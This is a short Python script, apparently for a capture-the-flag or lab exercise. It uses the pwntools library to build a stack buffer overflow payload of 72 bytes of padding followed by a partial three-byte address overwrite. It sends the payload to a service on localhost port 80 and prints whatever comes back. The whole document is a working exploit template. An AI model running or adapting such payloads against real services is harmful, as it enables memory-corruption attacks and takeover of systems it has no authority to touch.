from pwn import *

padding = b'A' * (64 + 8)
rbp = b'\x47\x11\x40'

payload = padding + rbp
assert len(payload) == 64 + 8 + 3

p = remote('localhost', 80)
p.sendline(payload)
r = p.recvall()
print(r)
